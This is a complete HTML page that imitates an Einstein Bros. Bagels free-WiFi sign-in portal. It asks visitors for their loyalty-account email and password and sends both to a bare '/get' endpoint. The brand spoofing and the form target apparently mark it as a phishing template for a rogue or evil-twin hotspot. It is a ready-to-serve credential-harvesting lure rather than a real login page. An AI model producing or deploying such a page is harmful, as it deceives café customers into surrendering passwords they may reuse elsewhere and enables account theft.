<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Einstein Bros Bagels WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f5f0e8;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:400px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 30px rgba(0,0,0,0.1)}
.top{background:#D4421A;padding:26px 24px 18px;text-align:center}
.brand{font-size:20px;font-weight:900;color:#fff;letter-spacing:0.5px;line-height:1.2}
.tagline{font-size:9px;color:rgba(255,255,255,0.7);letter-spacing:2px;text-transform:uppercase;margin-top:5px}
.mid{background:#B33515;padding:8px 24px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#FFC72C;border-radius:50%;flex-shrink:0}
.mid span{font-size:11px;color:rgba(255,255,255,0.8)}
.mid strong{color:#FFC72C;font-weight:600}
.body{padding:24px}
h2{font-size:17px;font-weight:700;color:#D4421A;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#888;margin-bottom:6px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #f0e0d0;border-radius:6px;font-size:14.5px;background:#fdfaf6;color:#1a1a1a;font-family:inherit}
input:focus{outline:none;border-color:#D4421A}
input::placeholder{color:#ccc}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:6px;background:#D4421A;color:#fff;font-size:13px;font-weight:700;cursor:pointer;font-family:inherit}
.terms{font-size:11px;color:#bbb;text-align:center;margin-top:12px;line-height:1.6}
.terms a{color:#D4421A}
.foot{background:#fdfaf6;border-top:1px solid #f0e0d0;padding:11px 24px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none}
.foot a{color:#D4421A}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="brand">Einstein Bros. Bagels</div>
    <div class="tagline">Brilliant Bagels &bull; Free WiFi</div>
  </div>
  <div class="mid"><div class="dot"></div><span>Network: <strong>EinsteinBros_WiFi</strong></span></div>
  <div class="body">
    <h2>Welcome to Einstein's</h2>
    <p class="sub">Sign in with your Shmear Society account to connect.</p>
    <form action="/get">
      <label class="lbl">Email Address</label>
      <input name="email" type="text" placeholder="you@example.com" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Connect</button>
      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; Einstein Noah Restaurant Group</span><a href="#">Help</a></div>
</div>
</body>
</html>
